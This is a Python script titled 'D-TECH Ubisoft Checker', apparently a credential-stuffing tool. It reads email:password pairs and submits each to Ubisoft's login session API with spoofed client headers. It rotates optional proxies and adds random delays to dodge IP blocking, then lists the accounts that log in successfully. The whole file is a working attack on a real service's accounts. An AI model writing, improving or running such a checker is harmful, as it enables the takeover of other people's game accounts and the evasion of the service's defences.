import requests
import base64
import json
import time
import random
import sys

# ANSI Colors for Display
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"

# D-TECH Banner
print(f"""{CYAN}
╔════════════════════════════════════════════╗
║            {BOLD}🔥 D-TECH Ubisoft Checker 🔥{RESET}{CYAN}         ║
║               made by {BOLD}preasx24{RESET}{CYAN}               ║
╚════════════════════════════════════════════╝{RESET}
""")

# Settings
HEADERS = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "GenomeId": "85c31714-0941-4876-a18d-2c7e9dce8d40",
    "Host": "public-ubiservices.ubi.com",
    "Origin": "https://connect.ubisoft.com",
    "Referer": "https://connect.ubisoft.com/",
    "Ubi-AppId": "314d4fef-e568-454a-ae06-43e3bece12a6",
    "Ubi-RequestedPlatformType": "uplay",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}
LOGIN_URL = "https://public-ubiservices.ubi.com/v3/profiles/sessions"

# Proxy Settings (Optional)
PROXIES = []


# Animated Typing Effect
def slow_print(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


# Progress Bar
def progress_bar(current, total, status):
    bar_length = 30
    progress = int((current / total) * bar_length)
    bar = f"{GREEN}{'█' * progress}{RESET}{' ' * (bar_length - progress)}"
    print(f"\r[{bar}] {current}/{total} - {status}", end='', flush=True)


# Check Ubisoft Account
def check_account(email, password):
    credentials = f"{email}:{password}"
    encoded_credentials = base64.b64encode(credentials.encode()).decode()
    data = {"rememberMe": True}
    headers = HEADERS.copy()
    headers["Authorization"] = f"Basic {encoded_credentials}"
    
    proxy = random.choice(PROXIES) if PROXIES else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    try:
        response = requests.post(LOGIN_URL, headers=headers, data=json.dumps(data), proxies=proxies)
        if response.status_code == 200 and "platformType" in response.text:
            print(f"\n{GREEN}[SUCCESS]{RESET} {email}:{password} - Valid Account")
            return True
        elif "Invalid credentials" in response.text:
            print(f"\n{RED}[INVALID]{RESET} {email}:{password} - Invalid credentials")
            return False
        else:
            print(f"\n{YELLOW}[ERROR]{RESET} {email}:{password} - Unexpected response")
            return False
    except requests.exceptions.RequestException as e:
        print(f"\n{RED}[ERROR]{RESET} Network issue: {e}")
        return False


# Main Execution
def main():
    slow_print(f"{YELLOW}[INFO]{RESET} Enter accounts in '{BOLD}email:password{RESET}' format, one per line.")
    slow_print(f"{YELLOW}[INFO]{RESET} Type '{BOLD}done{RESET}' when you're finished.\n")
    
    accounts_input = []
    while True:
        line = input(f"{CYAN}> {RESET}").strip()
        if line.lower() == 'done':
            break
        if ':' in line:
            accounts_input.append(line.split(':'))
        else:
            print(f"{RED}[ERROR]{RESET} Invalid format. Use '{BOLD}email:password{RESET}'.")
    
    if len(accounts_input) > 20:
        print(f"\n{YELLOW}[INFO]{RESET} You entered {len(accounts_input)} accounts. Only the first {BOLD}20{RESET} will be tested.\n")
        accounts_input = accounts_input[:20]
    else:
        print(f"\n{YELLOW}[INFO]{RESET} Loaded {len(accounts_input)} accounts.\n")
    
    successful_accounts = []
    
    for index, (email, password) in enumerate(accounts_input, start=1):
        status = f"Checking {email}"
        progress_bar(index, len(accounts_input), status)
        if check_account(email, password):
            successful_accounts.append(f"{email}:{password}")
        
        # Prevent IP blocking with delay
        delay = random.uniform(2, 5)
        print(f"{MAGENTA}[DELAY]{RESET} Waiting for {BOLD}{delay:.2f} seconds{RESET}...\n")
        time.sleep(delay)
    
    print(f"\n{BOLD}{CYAN}╔══════════════════════════════╗")
    print(f"║       Process Completed       ║")
    print(f"╚══════════════════════════════╝{RESET}")
    
    print(f"\n{BOLD}[SUMMARY]{RESET}")
    print(f"{GREEN}✓ Successful Accounts: {len(successful_accounts)}{RESET}")
    print(f"{RED}✗ Invalid/Failed Accounts: {len(accounts_input) - len(successful_accounts)}{RESET}\n")
    
    if successful_accounts:
        print(f"{BOLD}{GREEN}[SUCCESSFUL ACCOUNTS]{RESET}")
        for account in successful_accounts:
            print(f"{CYAN}- {account}{RESET}")
    else:
        print(f"{YELLOW}[INFO] No valid accounts found.{RESET}")


if __name__ == "__main__":
    main()
